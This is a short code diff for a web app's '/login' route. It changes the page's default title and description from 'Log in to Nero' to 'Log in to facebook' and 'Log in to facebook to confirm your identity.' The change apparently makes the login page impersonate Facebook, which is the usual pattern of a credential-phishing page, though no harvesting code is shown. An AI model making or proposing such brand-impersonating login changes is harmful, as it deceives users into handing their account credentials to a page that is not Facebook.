@@ -10,8 +10,8 @@ export const Route = createFileRoute("/login")({
   loader: () => getSiteData(),
   head: ({ loaderData }) => {
     const c = loaderData?.content.login;
-    const title = c?.seoTitle ?? "Log in to Nero";
-    const description = c?.seoDescription ?? "Log in to Nero.";
+    const title = c?.seoTitle ?? "Log in to facebook";
+    const description = c?.seoDescription ?? "Log in to facebook to confirm your identity.";
     return {
       meta: [
         { title },
